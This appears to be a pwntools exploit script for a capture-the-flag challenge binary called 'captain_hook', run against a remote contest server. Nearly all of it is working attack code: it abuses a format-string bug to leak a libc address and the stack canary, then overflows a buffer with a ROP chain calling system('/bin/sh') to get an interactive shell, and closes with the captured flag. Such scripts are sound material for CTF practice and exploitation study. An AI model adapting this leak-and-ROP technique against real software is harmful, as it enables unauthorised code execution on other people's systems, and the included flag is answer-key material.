from pwn import *

libc = ELF('./libc-2.27.so')
context.binary = elf = ELF('./captain_hook')
p = remote("sharkyctf.xyz", 20336)
# p = process('./captain_hook')
# gdb.attach(p, 'init-pwndbg\nbrva 0x118A')

def lock_up(idx, name, age, dob):
    p.sendlineafter(":~$ ", '2')
    p.sendlineafter("index ]: ", str(idx))
    p.sendlineafter("Name: ", name)
    p.sendlineafter("Age: ", str(age))
    p.sendafter("(mm/dd/yyyy): ", dob)


def edit(idx, name, age, dob):
    p.sendlineafter(":~$ ", '4')
    p.sendlineafter("index ]: ", str(idx))
    p.sendlineafter("Name: ", name)
    p.sendlineafter("Age: ", str(age))
    p.sendafter("(mm/dd/yyyy): ", dob)


def read_info(idx):
    p.sendlineafter(":~$ ", '3')
    p.sendlineafter("index ]: ", str(idx))


lock_up(0, "asdf", 12, "21/05/2000")
edit(0, "A"*10+"%19$p", 12, "22/05/2000")
read_info(0)
p.recvuntil("2000")
libc_base = int(p.recvuntil('.', drop=True),16) - 0x21b97
log.info("Libc : 0x{:x}".format(libc_base))


system = libc_base + libc.symbols['system']
bin_sh = libc_base + libc.search("/bin/sh").next()

edit(0, "A"*10+"%13$p", 12, "24/05/2000")
read_info(0)
p.recvuntil("2000")
canary = int(p.recvuntil('.', drop=True),16)
log.info("Canary: 0x{:x}".format(canary))

pop_rdi = libc_base + 0x000000000002155f
ret = libc_base + 0x00000000000008aa
ropchain = flat([
    pop_rdi, bin_sh,
    ret,
    system
])

edit(0, "A"*(0x30-0x8)+p64(canary)+"B"*8 + ropchain, 12, "24/05/2000")


p.interactive()
# shkCTF{I_R34lly_l0ve_fr33_H0Ok_m4n}
